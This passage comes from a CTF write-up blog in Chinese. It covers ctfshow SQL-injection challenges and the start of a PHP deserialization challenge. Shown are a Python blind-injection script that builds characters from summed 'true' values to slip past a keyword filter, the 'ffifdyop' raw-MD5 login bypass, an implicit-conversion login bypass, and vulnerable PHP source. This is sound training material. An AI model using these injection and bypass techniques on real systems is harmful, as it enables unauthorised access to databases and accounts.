style="color:#d7ba7d">\"</span><span style="color:#d16969">|union|</span><span style="color:#d7ba7d">\`</span><span style="color:#d16969">|sleep|benchmark/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>依旧过滤了单双引号，而且过滤了数字，但是数字可以用 true 和 false 构造，如：</p><p>比如想得到 c	而 c 的 ascii 为 99</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#ce9178">'c'</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">char</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">concat</span><span style="color:#d4d4d4">(true+true+true+true+true+true+true+true+true,true+true+true+true+true+true+true+true+true));</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161554271.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116155448177"></p><p>关键地方的思路是，用 true 拼接构造出数字，再使用 char 函数转换成字符，最后使用 concat 拼接起来。</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: yu22x</span></span>
<span class="line"><span style="color:#6a9955"># @Last Modified by:   f0ur_lin</span></span>
<span class="line"><span style="color:#6a9955"># @Last Modified time: 2023-01-16 15:52:15</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> string</span></span>
<span class="line"><span style="color:#d4d4d4">url=</span><span style="color:#ce9178">"http://e0d4d5a9-c5c4-4701-8ad7-517834993ad4.challenge.ctf.show/select-waf.php"</span></span>
<span class="line"><span style="color:#d4d4d4">s=</span><span style="color:#ce9178">'0123456789abcdef-</span><span style="color:#569cd6">{}</span><span style="color:#ce9178">'</span></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">convert</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">strs</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">  t=</span><span style="color:#ce9178">'concat('</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> s </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> strs:</span></span>
<span class="line"><span style="color:#d4d4d4">    t+= </span><span style="color:#ce9178">'char(true'</span><span style="color:#d4d4d4">+</span><span style="color:#ce9178">'+true'</span><span style="color:#d4d4d4">*(</span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(s)-</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">)+</span><span style="color:#ce9178">'),'</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> t[:-</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]+</span><span style="color:#ce9178">")"</span></span>
<span class="line"><span style="color:#d4d4d4">flag=</span><span style="color:#ce9178">''</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">range</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">45</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(i)</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> j </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> s:</span></span>
<span class="line"><span style="color:#d4d4d4">    d = convert(</span><span style="color:#569cd6">f</span><span style="color:#ce9178">'^ctfshow</span><span style="color:#569cd6">{</span><span style="color:#d4d4d4">flag+j</span><span style="color:#569cd6">}</span><span style="color:#ce9178">'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    data={</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#ce9178">'tableName'</span><span style="color:#d4d4d4">:</span><span style="color:#569cd6">f</span><span style="color:#ce9178">' ctfshow_user group by pass having pass regexp(</span><span style="color:#569cd6">{</span><span style="color:#d4d4d4">d</span><span style="color:#569cd6">}</span><span style="color:#ce9178">)'</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">#print(data)</span></span>
<span class="line"><span style="color:#d4d4d4">    r=requests.post(url,</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">=data)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">#print(r.text)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"user_count = 1"</span><span style="color:#d4d4d4">  </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> r.text):</span></span>
<span class="line"><span style="color:#d4d4d4">      flag+=j</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(flag)</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> j==</span><span style="color:#ce9178">'}'</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">exit</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#c586c0">break</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161556311.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116155618191"></p><h3 id="web187md5的ffifdyop万能密码"><a class="markdownIt-Anchor" href="#web187md5的ffifdyop万能密码"></a> web187（md5 的 ffifdyop 万能密码）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$sql</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"select count(*) from ctfshow_user where username = '</span><span style="color:#9cdcfe">$username</span><span style="color:#ce9178">' and password= '</span><span style="color:#9cdcfe">$password</span><span style="color:#ce9178">'"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'username'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'password'</span><span style="color:#d4d4d4">],</span><span style="color:#569cd6">true</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">//只有admin可以获得flag</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">!=</span><span style="color:#ce9178">'admin'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]=</span><span style="color:#ce9178">'用户名不存在'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">json_encode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span></code></pre></div></div></figure><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ffifdyop</span></span>
<span class="line"><span style="color:#6a9955"># md5(ffifdyop,true) = 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span></span></code></pre></div></div></figure><p>登录成功后可以打开 f12 找到 flag（或者抓包）</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161621596.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116162116474"></p><h3 id="web188隐式转换"><a class="markdownIt-Anchor" href="#web188隐式转换"></a> web188（隐式转换）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$sql</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"select pass from ctfshow_user where username = {</span><span style="color:#9cdcfe">$username</span><span style="color:#ce9178">}"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>返回逻辑：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955">//用户名检测</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/and|or|select|from|where|union|join|sleep|benchmark|,|</span><span style="color:#d7ba7d">\(</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\)</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]=</span><span style="color:#ce9178">'用户名非法'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">json_encode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">//密码检测</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]=</span><span style="color:#ce9178">'密码只能为数字'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">json_encode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">//密码判断</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$row</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'pass'</span><span style="color:#d4d4d4">]==</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]=</span><span style="color:#ce9178">'登陆成功'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">array_push</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'data'</span><span style="color:#d4d4d4">], </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">=&gt;</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">  }</span></span></code></pre></div></div></figure><p>这里看逻辑的话，是存在一个隐式转换的。</p><h4 id="隐式转换"><a class="markdownIt-Anchor" href="#隐式转换"></a> 隐式转换</h4><p>当这个 username 没有用单引号进行包括的话，</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">$sql</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"select pass from ctfshow_user where username = {</span><span style="color:#9cdcfe">$username</span><span style="color:#ce9178">}"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>刚好表中的 username 是字母等非数字的话，那么在和数字进行比较的时候会被转换成 0：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># username 的值为 </span><span style="color:#569cd6">admin</span><span style="color:#d4d4d4">，如果这时我们传入username则会恒为真</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171529126.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117152920037"></p><p>而我的表结构中除了这两个 password 的 username 为字母外，其他为数字，所以不会被查出：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">mysql&gt; </span><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> * </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> user;</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----+----------+---------------------------+</span></span>
<span class="line"><span style="color:#d4d4d4">| id | username | </span><span style="color:#569cd6">password</span><span style="color:#d4d4d4">                  |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----+----------+---------------------------+</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4"> | </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">        | </span><span style="color:#b5cea8">11</span><span style="color:#d4d4d4">                        |</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4"> | </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">        | </span><span style="color:#b5cea8">5316516</span><span style="color:#d4d4d4">                   |</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4"> | flag     | flag{y0u_ar1_r1ally_g0od} |</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4"> | admin1   | flag_not_me               |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----+----------+---------------------------+</span></span>
<span class="line"><span style="color:#b5cea8">4</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">rows</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">set</span><span style="color:#d4d4d4"> (</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">.</span><span style="color:#b5cea8">03</span><span style="color:#d4d4d4"> sec)</span></span></code></pre></div></div></figure><p>而如果我们的表中有 username 为 5admin 这种，那么可以尝试：username = 5</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">mysql&gt; </span><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> username,</span><span style="color:#569cd6">password</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> user </span><span style="color:#569cd6">where</span><span style="color:#d4d4d4"> username = </span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----------+----------+</span></span>
<span class="line"><span style="color:#d4d4d4">| username | </span><span style="color:#569cd6">password</span><span style="color:#d4d4d4"> |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----------+----------+</span></span>
<span class="line"><span style="color:#d4d4d4">| 5admin   | zhangsan |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----------+----------+</span></span>
<span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">row</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">set</span><span style="color:#d4d4d4"> (</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">.</span><span style="color:#b5cea8">03</span><span style="color:#d4d4d4"> sec)</span></span></code></pre></div></div></figure><p>可以看到，依旧可以利用隐式转换查询出这个字段的值。</p><p>所以这里我们默认 flag 可能藏在 admin 这个字段下，那么<strong>我们需要传的 username 就是 0</strong> 了</p><p>再来看密码部分。</p><p>如果真正的密码也是字符而不是数字呢？那么是不是我们只需要也传 password 为 0（也可能是好几个 0 如果有长度限制的话）即可？答案正是如此。</p><p>因为我们知道密码既是 flag 值，那么 flag 值算上开头的格式也就不可能时纯数字的了。</p><p>所以这题传：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># 用户名：</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#b5cea8">0</span></span>
<span class="line"><span style="color:#d4d4d4"># 密码：</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#b5cea8">00000000</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171538546.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117153832410"></p><h2 id="ctfshow_菜鸟杯复现"><a class="markdownIt-Anchor" href="#ctfshow_菜鸟杯复现"></a> ctfshow_菜鸟杯复现</h2><h3 id="17小舔田反序列化"><a class="markdownIt-Anchor" href="#17小舔田反序列化"></a> 17. 小舔田？(反序列化)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Moon</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$name</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"月亮"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__toString</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"我是"</span><span style="color:#d4d4d4">.</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"快来赏我"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Ion_Fan_Princess</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$nickname</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"牛夫人"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">call</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">global</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">nickname</span><span style="color:#d4d4d4">==</span><span style="color:#ce9178">"小甜甜"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家"</span><span style="color:#d4d4d4">.</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">nickname</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"。</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__toString</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">call</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\t\t\t\t\t\t\t\t\t\t</span><span style="color:#ce9178">----"</span><span style="color:#d4d4d4">.</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">nickname</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'code'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'code'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Ion_Fan_Princess</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"></span>
